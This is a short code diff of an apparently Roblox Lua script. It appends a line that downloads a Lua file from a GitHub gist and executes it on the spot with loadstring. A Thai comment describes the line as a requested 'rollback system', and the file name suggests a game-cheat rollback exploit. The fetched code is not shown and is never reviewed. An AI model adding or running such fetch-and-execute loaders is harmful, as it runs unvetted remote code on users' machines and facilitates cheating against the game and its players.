@@ -98,3 +98,6 @@ task.spawn(function()
         end
     end)
 end)
+
+-- 🚀 [ระบบ Rollback ที่คุณสั่งเพิ่ม ให้รันเป็นตัวปิดท้าย]
+loadstring(game:HttpGet("https://gist.githubusercontent.com/Snowtmm/c4f4f21ce725632ad1992e307f97b766/raw/d3f9af952b2167c5eab9bbbefcdd6234998ad443/RollBackgag2.lua"))()
